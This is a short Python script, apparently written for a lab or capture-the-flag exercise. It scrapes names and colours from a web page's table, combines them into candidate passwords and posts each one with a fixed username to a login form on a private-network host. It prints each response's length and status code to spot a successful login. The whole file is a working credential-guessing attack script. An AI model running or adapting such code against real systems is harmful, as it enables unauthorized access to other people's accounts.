#!/usr/bin/python3
#headers.py

import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup


url = "http://192.168.51.68:8080/about.html"
url1 = "http://192.168.51.68:8080/login-3/index.php"
response = requests.get(url)
soup = BeautifulSoup(response.content, features="html.parser")
username="dvaliant@bedlamdynamics.com"

#table1 = soup.find("table", border=1)
#table2 = table1.find('tbody')
#table2 = table1.find_all('tr')
#rows = soup.find("table").find_all("tr")


for k in soup.find_all('tr'):
  for row in soup.find_all('tr'):    
    columns = row.find_all('td')
    columns2=k.find_all('td')  
    if(columns != []):
      if(columns2!=[]):
        name = columns[0].text.strip()
#        print(name)
        color=columns2[3].text.strip().capitalize()
#        print(color)
        pw=name+color+name+color
#        print(pw)
        info={'username':username, 'password':pw}
        post=requests.post(url1,data=info)
        print(pw+"  "+str(len(post.text))+" "+str(post.status_code))
